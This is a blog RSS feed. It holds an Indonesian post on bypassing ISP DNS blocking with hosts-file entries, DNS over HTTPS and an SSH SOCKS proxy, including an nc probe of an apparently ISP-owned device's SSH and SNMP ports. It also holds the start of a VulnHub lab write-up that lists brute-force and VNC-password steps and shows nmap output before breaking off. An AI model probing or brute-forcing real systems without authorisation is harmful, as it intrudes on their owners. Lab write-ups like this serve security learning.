<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Tunneling on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/tunneling/</link>
    <description>Recent content in Tunneling on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Thu, 04 Nov 2021 16:40:44 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/tunneling/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Hosts file, DNS over HTTPS dan SSH SOCKS Proxy [ID]</title>
      <link>https://fahmifj.github.io/blog/hosts-file-dns-over-https-and-ssh-socks-proxy/</link>
      <pubDate>Thu, 04 Nov 2021 16:40:44 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/hosts-file-dns-over-https-and-ssh-socks-proxy/</guid>
      <description>Can we use these to bypass DNS filters and conceal ourselves from ISPs? Let&amp;#39;s find out!</description>
      <content:encoded><![CDATA[<p>Saat ini sebagian besar browser-browser populer sudah memiliki fitur <a href="https://developers.cloudflare.com/1.1.1.1/encrypted-dns">DNS over HTTPS (DoH)</a>. Tapi meskipun begitu, ternyata masih banyak yang belum tahu tentang adanya fitur ini.</p>
<figure>
    <img src="imgs/image-20211104224726768.png"
         alt="Settingan DoH pada Chrome dan Firefox"/> <figcaption>
            <p>Settingan DoH pada Chrome dan Firefox
            </p>
        </figcaption>
</figure>

<p><em><strong>Loh tahu dari mana?</strong></em></p>
<p><em>Flashback</em> sedikit, jadi ada beberapa teman yang setiap kali mau mengakses reddit atahu web streaming anime <del>i</del>legal, mereka harus pakai VPN untuk bypass blokirannya ISP. Karena VPN-nya ini gratisan (baca: dipakai berjamaah dan di-limit), sudah pasti jatuhnya lemot.</p>
<p>Dan setelah mereka tahu soal fitur DoH, salah satunya memberi respon berikut:</p>
<figure>
    <img src="imgs/image-20211103210137432.png"
         alt="Sebuah testimoni"/> <figcaption>
            <p>Sebuah testimoni
            </p>
        </figcaption>
</figure>

<p>Agak risih juga sih ISP di negara ini sukanya main bloc-bloc-an.</p>
<p>Nah di postingan ini saya akan coba bahas kenapa DoH bisa dipakai untuk mem-<em>bypass</em> website yang diblokir. Selanjutnya saya juga akan menggunakan dua cara alternatif untuk melakukan bypass (tanpa VPN) dan mencari tahu apakah cara&quot; tersebut sudah cukup untuk menyembunyikan kita dari ISP.</p>
<h2 id="how-do-isps-block-websites">How do ISPs block websites?</h2>
<p>Normalnya ketika kita mengakses sebuah situs, misal <code>www.reddit.com</code>, komputer kita akan mengirimkan sebuah kueri DNS ke sebuah DNS server untuk menanyakan alamat IP dari domain <code>www.reddit.com</code> agar halaman situs tersebut bisa dimuat kemudian. Kueri DNS ini biasanya diarahkan ke DNS server milik ISP/operator seluler yang kamu pakai.</p>
<p>Nah ketika kita mengakses situs yang kebetulan terdaftar di <em>blacklist</em> DNS server ISP, maka DNS server tersebut akan memberikan alamat IP palsu yang merupakan halaman blokir milik si ISP seperti merconsuar, ipo, dll.</p>
<p>Kita bisa liat alur-nya secara detail dengan WireShark, tetapi agar lebih simple, kita juga bisa menggunakan <code>tracert</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ tracert -4 -d -h <span class="m">5</span> www.reddit.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Tracing route to blockpage.****.id <span class="o">[</span>***.215.197.131<span class="o">]</span> 
</span></span><span class="line"><span class="cl">over a maximum of <span class="m">5</span> hops:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="m">1</span>     <span class="m">2</span> ms     <span class="m">2</span> ms     <span class="m">2</span> ms  192.168.1.1 
</span></span><span class="line"><span class="cl">  <span class="m">2</span>     *        *        *     Request timed out.
</span></span><span class="line"><span class="cl">  <span class="m">3</span>    <span class="m">38</span> ms    <span class="m">32</span> ms    <span class="m">24</span> ms  10.***.44.1 
</span></span><span class="line"><span class="cl">  <span class="m">4</span>    <span class="m">26</span> ms    <span class="m">31</span> ms    <span class="m">22</span> ms  ***.215.248.78 
</span></span><span class="line"><span class="cl">  <span class="m">5</span>    <span class="m">33</span> ms    <span class="m">25</span> ms    <span class="m">27</span> ms  ***.215.248.82 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Trace complete.
</span></span></code></pre></div><blockquote>
<p>Di hop kedua saya kurang yakin apakah modem ADSL tidak punya/punya hop count seperti router yang akhirnya tracert menampilkan timeout, atahu memang pure timeout.</p>
</blockquote>
<p>Berdasarkan hasil <code>tracert</code> diatas, <code>www.reddit.com</code> di <em>resolve</em> ke <code>blockpage.sensor.id</code> yang alamat IPnya <code>***.215.248.131</code> dan kita bisa validasi ini menggunakan <a href="https://toolbox.googleapps.com/apps/dig/#A/">Google Toolbox Dig</a> yang hasilnya:</p>
<figure>
    <img src="imgs/image-20211104095424598.png"
         alt="Hasil dig www.reddit.com"/> <figcaption>
            <p>Hasil dig <a href="https://www.reddit.com">www.reddit.com</a>
            </p>
        </figcaption>
</figure>

<p>Ternyata alamat dari <code>www.reddit.com</code> adalah <code>151.101.X.140</code>, bukan <code>***.215.197.131</code>!</p>
<p>Yah komputernya kena penipuan :/</p>
<p>Anyway, alur <em>request</em>-nya bisa diilustrasikan seperti berikut.</p>
<figure>
    <img src="imgs/image-20211103163418666.png"
         alt="Ilustrasi(nya)"/> <figcaption>
            <p>Ilustrasi(nya)
            </p>
        </figcaption>
</figure>

<p><em><strong>Darimana saya tahu 10.***.44.1 itu router ISP?</strong></em></p>
<p>Nope, saya gak tahu itu router atahu bukan, tapi perangkat ini punya port SSH dan SNMP, jadi kemungkinan perangkat ini di monitor.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ nc -vn 10.***.44.1 <span class="m">22</span>
</span></span><span class="line"><span class="cl">Ncat: Version 5.59BETA1 <span class="o">(</span> http://nmap.org/ncat <span class="o">)</span>
</span></span><span class="line"><span class="cl">Ncat: Connected to 10.***.44.1:22.
</span></span><span class="line"><span class="cl">SSH-2.0-OpenSSH_7.5
</span></span><span class="line"><span class="cl">$ nc -u -vn 10.***.44.1 <span class="m">161</span>
</span></span><span class="line"><span class="cl">Ncat: Version 5.59BETA1 <span class="o">(</span> http://nmap.org/ncat <span class="o">)</span>
</span></span><span class="line"><span class="cl">Ncat: Connected to 10.***.44.1:161
</span></span></code></pre></div><p><em><strong>Tapi kan HTTPS?</strong></em></p>
<p>Enkripsi HTTPS/TLS itu ada di bagian kontennya<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>, sedangkan paket-paket DNS kueri yang dikirimkan untuk me-<em>resolve</em> nama domain ke sebuah alamat IP tidak masuk ke dalam enkripsi tersebut.</p>
<blockquote>
<p>Kueri DNS itu mendahului trafik HTTP/S</p>
</blockquote>
<p>Jadi misalnya ketika kita melakukan login di suatu HTTPS website, ISP gak akan tahu username dan password yang kita masukkan, bentukan login page tersebut, dan bahkan sampai ke <em>endpoint</em> URLnya (<code>website.com/api/v1/login/?username=admin&amp;password=admin123</code>).</p>
<figure>
    <img src="imgs/image-20211104092043412.png"
         alt="Contoh konten yang dienkripsi"/> <figcaption>
            <p>Contoh konten yang dienkripsi
            </p>
        </figcaption>
</figure>

<p>Dengan kata lain, ISP hanya tahu tujuan kita mau kemana, tapi dia (seharusnya) gak bisa lihat apa yang kita lakukan di tempat tujuan itu.</p>
<p>Sampai disini, tentunya kita bisa menyimpulkan sendiri kenapa DoH bisa membuat komputer kita menghindari &ldquo;penipuan&rdquo; yang dilakukan DNS server ISP tersebut.</p>
<p>Yap, karena kueri DNSnya dibungkus HTTPS.</p>
<p>Awalnya DNS kueri dikirimkan tanpa enkripsi ke DNS server ISP melalui port 53, tapi dengan DoH, DNS kueri ini sekarang di <em>deliver</em> melalui HTTPS ke <em>endpoint</em> DoH yang juga HTTPS, misalnya Cloudflare: <a href="https://cloudflare-dns.com/dns-query">https://cloudflare-dns.com/dns-query</a>.</p>
<p><em><strong>Terus cloudflare-dns.com di resolve siapa?</strong></em></p>
<p>DNSnya ISP wkwkw. Yah ketahuan kan pakai DoH.</p>
<p>Tenang, kita bisa pakai versi IP 1^4-nya.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl -H <span class="s1">&#39;accept: application/dns-json&#39;</span> <span class="s2">&#34;https://1.1.1.1/dns-query?name=www.reddit.com&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;Status&#34;</span>:0,<span class="s2">&#34;TC&#34;</span>:false,<span class="s2">&#34;RD&#34;</span>:true,<span class="s2">&#34;RA&#34;</span>:true,<span class="s2">&#34;AD&#34;</span>:false,<span class="s2">&#34;CD&#34;</span>:false,<span class="s2">&#34;Question&#34;</span>:<span class="o">[{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;www.reddit.com&#34;</span>,<span class="s2">&#34;type&#34;</span>:1<span class="o">}]</span>,<span class="s2">&#34;Answer&#34;</span>:<span class="o">[{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;www.reddit.com&#34;</span>,<span class="s2">&#34;type&#34;</span>:5,<span class="s2">&#34;TTL&#34;</span>:288,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net.&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.65.140&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.129.140&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.193.140&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.1.140&#34;</span><span class="o">}]}</span>
</span></span></code></pre></div><h2 id="thou-shalt-bypass">Thou Shalt (By)Pass</h2>
<h3 id="hosts-file-the-primivite-dns">Hosts file: The Primivite DNS</h3>
<p>Tanpa DoH, sebenarnya kita bisa menghindari &ldquo;penipuan&rdquo; alamat IP tersebut di level <em>cache</em>.</p>
<p>Kita tahu bahwa alasan komputer kita membuat DNS kueri terlebih dahulu ke DNS server saat akan mengakses sebuah website adalah karena si komputer belum tahu alamat IP dari website/domain yang kita maksud. Setelah si komputer tahu, alamat IP dan domain web ini akan di simpan pada DNS Resolver cache. Di <em>request</em> selanjutnya, si komputer akan mengandalkan daftar cache yang ada (selama belum <em>expired</em>).</p>
<p>Pada Windows, kita bisa melihat daftar IP dan nama domain yang sudah di cache dengan menjalankan perintah berikut.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\&gt;</span>ifconfig /displaydns
</span></span></code></pre></div><p>DNS server sendiri pada dasarnya hanyalah sekumpulan entry yang me-<em>mapping</em> alamat IP dengan nama domain secara dinamik. Pada level OS, terdapat sebuah file yang merupakan bentukan primivite dari DNS bersifat statik, yaitu file <code>hosts</code>.</p>
<p>File <code>hosts</code> Windows bisa ditemukan di <code>C:\Windows\System32\drivers\etc\hosts</code> sedangkan untuk Unix-like, file <code>hosts</code> terdapat di <code>/etc/hosts</code>. Karena saya pengguna Windows, yang akan di bahas disini adalah <code>hosts</code> file Windows saja (pengguna Linux rata-rata sudah suhu soalnya).</p>
<figure>
    <img src="imgs/image-20211104123812239.png"
         alt="Windows hosts file"/> <figcaption>
            <p>Windows hosts file
            </p>
        </figcaption>
</figure>

<p>Pada Windows, file <code>hosts</code> ini akan selalu di-<em>load</em> ke dalam DNS Resolve cache, dan kita bisa memanfaatkan ini untuk memberi tahu komputer secara langsung bahwa alamat IP, misalnya <code>www.reddit.com</code>, adalah <code>151.101.129.140</code>. Caranya memberi tahunya adalah dengan menambahkan sebuah entry ke dalam file <code>hosts</code> dengan format berikut.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"># [Alamat IP] [domain name 1] [domain name 2] [domain name N]
</span></span><span class="line"><span class="cl">151.101.129.140 reddit.com www.reddit.com
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20211104131236469.png" alt="image-20211104131236469"  /></div>
</p>
<p>Sekarang kita bisa jalankan kembali perintah yang sama untuk menampilkan DNS cache, tapi sebelum itu ada baiknya DNS cache ini di-<em>flush</em> terlebih dulu.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\&gt;</span>ipconfig /flushdns <span class="c1"># clear cache dulu untuk menghilangkan brainwash dari DNS server ISP</span>
</span></span><span class="line"><span class="cl">C:<span class="se">\&gt;</span>ipconfig /displaydns
</span></span></code></pre></div><p>Seharusnya saat ini <code>www.reddit.com</code> dan <code>reddit.com</code> berada di entry paling atas.</p>
<p>Karena si komputer sudah tahu alamat IP dari <code>www.reddit.com</code>, maka dia tidak perlu lagi &ldquo;bertanya&rdquo; ke DNS server ISP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ tracert -d www.reddit.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Tracing route to reddit.com <span class="o">[</span>151.101.129.140<span class="o">]</span>
</span></span><span class="line"><span class="cl">over a maximum of <span class="m">30</span> hops:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="m">1</span>   <span class="m">120</span> ms     <span class="m">2</span> ms     <span class="m">3</span> ms  192.168.43.1
</span></span><span class="line"><span class="cl">  <span class="m">2</span>     *        *        *     Request timed out.
</span></span><span class="line"><span class="cl">  <span class="m">3</span>   <span class="m">162</span> ms    <span class="m">26</span> ms    <span class="m">26</span> ms  10.***.44.2
</span></span><span class="line"><span class="cl">  <span class="m">4</span>   <span class="m">160</span> ms    <span class="m">25</span> ms    <span class="m">30</span> ms  ***.215.36.238 
</span></span><span class="line"><span class="cl">  <span class="m">5</span>   <span class="m">187</span> ms    <span class="m">46</span> ms    <span class="m">46</span> ms  180.87.12.233
</span></span><span class="line"><span class="cl">  <span class="m">6</span>   <span class="m">186</span> ms    <span class="m">57</span> ms    <span class="m">50</span> ms  180.87.12.232
</span></span><span class="line"><span class="cl">  <span class="m">7</span>   <span class="m">191</span> ms    <span class="m">49</span> ms    <span class="m">47</span> ms  180.87.12.250
</span></span><span class="line"><span class="cl">  <span class="m">8</span>    <span class="m">49</span> ms    <span class="m">49</span> ms    <span class="m">48</span> ms  210.57.30.38
</span></span><span class="line"><span class="cl">  <span class="m">9</span>   <span class="m">188</span> ms    <span class="m">53</span> ms    <span class="m">52</span> ms  202.84.219.174
</span></span><span class="line"><span class="cl"> <span class="m">10</span>    <span class="m">70</span> ms    <span class="m">49</span> ms    <span class="m">52</span> ms  202.84.219.174
</span></span><span class="line"><span class="cl"> <span class="m">11</span>    <span class="m">60</span> ms    <span class="m">54</span> ms    <span class="m">49</span> ms  202.84.224.197
</span></span><span class="line"><span class="cl"> <span class="m">12</span>    <span class="m">83</span> ms    <span class="m">80</span> ms    <span class="m">85</span> ms  210.57.38.171
</span></span><span class="line"><span class="cl"> <span class="m">13</span>   <span class="m">205</span> ms   <span class="m">200</span> ms   <span class="m">203</span> ms  151.101.129.140 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Trace complete.
</span></span></code></pre></div><p><em><strong>Kalau untuk website lain gimana?</strong></em></p>
<p>Google Toolbox!</p>
<p>Jadi kamu resolve dulu IPnya lewat Google Toolbox Dig.</p>
<p><div class="img-container"><img src="imgs/image-20211104142819468.png" alt="image-20211104142819468"  /></div>
</p>
<p>Maka di <code>hosts</code> filenya:</p>
<p><div class="img-container"><img src="imgs/image-20211104142858365.png" alt="image-20211104142858365"  /></div>
</p>
<h3 id="ssh-socks-proxy--doh">SSH SOCKS Proxy + DoH</h3>
<p>Penggunaan <code>host</code> file dan DoH memang bisa mem-<em>bypass</em> Website, tapi pihak ISP tetap bisa mengetahui kita mengakses situs dan domain apa.</p>
<p>Untuk menghindari itu, salah satu cara &lsquo;murah&rsquo; dan mudah yang saya gunakan selain VPN adalah menggunakan <em>private server</em> lalu memanfaatkan fitur builtin SOCKS <a href="https://en.wikipedia.org/wiki/Proxy_server">proxy</a> dari SSH (jatuhnya transparan). <em>Private server</em> ini saya deploy sendiri di Microsoft Azure.</p>
<blockquote>
<p>Jika dari pembaca ada yang masih berstatus &lsquo;student&rsquo;, silahkan cek link berikut:</p>
<ul>
<li><a href="https://azure.microsoft.com/en-us/free/students/">https://azure.microsoft.com/en-us/free/students/</a></li>
</ul>
</blockquote>
<p>Untuk memanfaatkan SSH tunnel sebagai SOCKS proxy, perintahnya cukup simple:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ssh -i az_vm.key fproxy-user@20.109.***.213 -D <span class="m">1080</span> -N
</span></span></code></pre></div><ul>
<li><code>-D 1080</code>: Buka SOCKS proxy di port 1080 (listen)</li>
<li><code>-N</code>: Tanpa interactive shell.</li>
</ul>
<p>Saat ini SOCKS Proxy via SSH sudah tersedia di <code>127.0.0.1</code> port <code>1080</code>, dan kita tinggal mengkonfigurasikan setting-an proxy pada browser seperti berikut:</p>
<figure>
    <img src="imgs/image-20211104161049841.png"
         alt="Firefox proxy settings"/> <figcaption>
            <p>Firefox proxy settings
            </p>
        </figcaption>
</figure>

<p>Mudah kan?</p>
<p>Btw, saya pakai ekstensi browser <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a>, supaya saat <em>switch on/off</em>-nya mudah dan gak harus buka-buka settingan browser, berikut tampilannya.</p>
<figure>
    <img src="imgs/image-20211104160902204.png"
         alt="FoxyProxy Toogle"/> <figcaption>
            <p>FoxyProxy Toogle
            </p>
        </figcaption>
</figure>

<p>Konfigurasinya? sama dengan settingan browser!</p>
<figure>
    <img src="imgs/image-20211104090204141.png"
         alt="Konfigurasi SOCKS Proxy di Foxy Proxy"/> <figcaption>
            <p>Konfigurasi SOCKS Proxy di Foxy Proxy
            </p>
        </figcaption>
</figure>

<p>Dengan mengirimkan <em>request</em> ke <code>ifconfig.co/json</code>, saat ini IP saya adalah IP dari si private server.</p>
<figure>
    <img src="imgs/image-20211104090145368.png"
         alt="Akses ifconfig.co dengan proxy"/> <figcaption>
            <p>Akses ifconfig.co dengan proxy
            </p>
        </figcaption>
</figure>

<p>Lalu ditambah dengan DoH dan di test lewat <a href="https://dnsleaktest.com/">https://dnsleaktest.com/</a>.</p>
<figure>
    <img src="imgs/image-20211104090533201.png"
         alt="Test DNS leak dengan DoH aktif"/> <figcaption>
            <p>Test DNS leak dengan DoH aktif
            </p>
        </figcaption>
</figure>

<p>Sampai sini seharusnya ISP kurang lebih hanya melihat komputer saya yang mengakses si private server dengan trafik seperti berikut.</p>
<figure>
    <img src="imgs/image-20211104152555436.png"
         alt="Web trafic yang terenkripsi melalui SSH tunnel"/> <figcaption>
            <p>Web trafic yang terenkripsi melalui SSH tunnel
            </p>
        </figcaption>
</figure>

<h2 id="conclusion">Conclusion</h2>
<p>Selain menggunakan VPN, setidaknya ada 3 solusi di postingan ini yang bisa kamu coba untuk mem-bypass DNS filter yang diterapkan oleh ISP langganan kamu:</p>
<ul>
<li>Hosts file,</li>
<li>DoH,</li>
<li>SSH SOCKS Proxy + DoH.</li>
</ul>
<p>Menggunakan <code>hosts</code> file dan DoH hanya sebatas menghindari komputer kita dari &ldquo;penipuan&rdquo; alamat palsu oleh DNS server ISP. Sedangkan untuk &ldquo;SSH SOCKS Proxy + Doh&rdquo;, selain menghindari &ldquo;penipuan&rdquo;, tunnel yang dibuat juga mengenkripsi keseluruhan trafik web kita.</p>
<p>Hasil <em>testing</em> ketiganya, bukan <em>testing</em> sih, bisa ditabelkan(?) seperti berikut.</p>
<div class="force-center">
<table>
<thead>
<tr>
<th></th>
<th>Bypass DNS filters</th>
<th>Hide the domain we visit ?</th>
</tr>
</thead>
<tbody>
<tr>
<td>Hosts file</td>
<td>Probably yes</td>
<td>No</td>
</tr>
<tr>
<td>DoH</td>
<td>Yes, mostly</td>
<td>No</td>
</tr>
<tr>
<td>DoH + SSH SOCKS Proxy</td>
<td>Yes, mostly, but it depends.</td>
<td>Yes</td>
</tr>
</tbody>
</table>
</div>
<p><em><strong>Apakah dengan ini saya sudah <del>bisa menjadi anggota</del> anonymous?</strong></em></p>
<p>Nope, karena private server yang saya pakai pun milik sesuatu yang lebih besar dari ISP dan dua-duanya mengumpulkan data juga.</p>
<p>Baiklah, sekian untuk postingan ini~</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://https.cio.gov/faq/#what-does-https-do">https://https.cio.gov/faq/#what-does-https-do</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    
    <item>
      <title>VulnHub - Alfa</title>
      <link>https://fahmifj.github.io/vulnhub/alfa/</link>
      <pubDate>Sun, 13 Jun 2021 16:55:14 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/vulnhub/alfa/</guid>
      <description>Do a simple OSINT to get shell access and VNC hijack</description>
      <content:encoded><![CDATA[<p>Alfa starts with enumeration on FTP to obtain a username and an image file which named after a pet. It continues with finding a hidden path to intranet chat support from <code>robots.txt</code> file . The chat conversation reveals sensitive information and it allows me to guess a user&rsquo;s password for initial access. In the user&rsquo;s home directory, there is a VNC password, and it can be used to log into the currently running VNC server as root.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Generating password list</li>
<li>Brute-force FTP and SSH</li>
<li>VNC password decrypt</li>
<li>SSH tunneling</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Hydra</li>
<li>Crackmapexec</li>
<li>Gobuster</li>
<li>Brainfuck decoder - <a href="https://www.dcode.fr/brainfuck-language">https://www.dcode.fr/brainfuck-language</a></li>
<li>VNCviewer</li>
<li>pspy</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial scan with <code>nmap</code> discovers four open ports: FTP on port 21, HTTP on port 80, SMB on port 139 and 445.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA nmap/10-initial-alfa 192.168.2.109 -v
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap 7.80 scan initiated Thu Apr 22 02:41:12 2021 as: nmap -sC -sV -oA nmap/10-initial-alfa -v 192.168.2.109</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.2.109
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00056s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">996</span> closed ports
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE     VERSION
</span></span><span class="line"><span class="cl">21/tcp  open  ftp         vsftpd 3.0.3
</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Dec <span class="m">17</span> 13:02 thomas
</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   STAT: 
</span></span><span class="line"><span class="cl"><span class="p">|</span> FTP server status:
</span></span><span class="line"><span class="cl"><span class="p">|</span>      Connected to ::ffff:192.168.2.103
</span></span><span class="line"><span class="cl"><span class="p">|</span>      Logged in as ftp
</span></span><span class="line"><span class="cl"><span class="p">|</span>      TYPE: ASCII
</span></span><span class="line"><span class="cl"><span class="p">|</span>      No session bandwidth limit
</span></span><span class="line"><span class="cl"><span class="p">|</span>      Session timeout in seconds is <span class="m">300</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>      Control connection is plain text
</span></span><span class="line"><span class="cl"><span class="p">|</span>      Data connections will be plain text
</span></span><span class="line"><span class="cl"><span class="p">|</span>      At session startup, client count was <span class="m">3</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>      vsFTPd 3.0.3 - secure, fast, stable
</span></span><span class="line"><span class="cl"><span class="p">|</span>_End of status
</span></span><span class="line"><span class="cl">80/tcp  open  http        Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: OPTIONS HEAD GET POST
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Alfa IT Solutions
</span></span><span class="line"><span class="cl">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl">445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:9C:8A:46 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
</span></span><span class="line"><span class="cl">Service Info: Host: ALFA<span class="p">;</span> OS: Unix
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: -40m01s, deviation: 1h09m16s, median: -2s
</span></span><span class="line"><span class="cl"><span class="p">|</span> nbstat: NetBIOS name: ALFA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Names:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   ALFA&lt;00&gt;             Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   ALFA&lt;03&gt;             Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   ALFA&lt;20&gt;             Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-os-discovery: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS: Windows 6.1 <span class="o">(</span>Samba 4.9.5-Debian<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Computer name: alfa
</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS computer name: ALFA<span class="se">\x</span><span class="m">00</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Domain name: <span class="se">\x</span><span class="m">00</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   FQDN: alfa
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System time: 2021-04-22T08:41:36+02:00
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   account_used: guest
</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-04-22T06:41:36
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
